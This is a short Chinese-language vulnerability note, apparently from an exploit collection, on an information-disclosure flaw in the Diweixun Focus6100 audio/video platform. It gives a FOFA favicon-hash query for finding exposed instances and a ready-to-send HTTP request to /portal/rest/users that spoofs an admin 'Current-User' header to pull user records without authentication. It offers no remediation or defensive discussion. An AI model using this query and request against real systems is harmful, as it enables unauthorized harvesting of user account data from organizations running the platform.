# 迪威讯Focus6100音视频通讯平台存在敏感信息泄露漏洞

# 一、漏洞简介
迪威讯Focus6100音视频通讯平台存在敏感信息泄露漏洞

# 二、影响版本
+ 迪威讯Focus6100音视频通讯平台

# 三、资产测绘
+ fofa`web.icon=="bbc933535a6bfe478afb1fd0b3c470bf"`
+ 特征

![1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3.png](./img/KnyYKXzCYtkOpk7c/1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3-744711.png)

# 四 、漏洞复现
```java
GET /portal/rest/users HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```

![1727236656514-5bb4c381-fbea-4fc1-b574-5c4e273f04e8.png](./img/KnyYKXzCYtkOpk7c/1727236656514-5bb4c381-fbea-4fc1-b574-5c4e273f04e8-402836.png)



> 更新: 2024-10-22 09:36:09  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tgilgex06w0aebxb>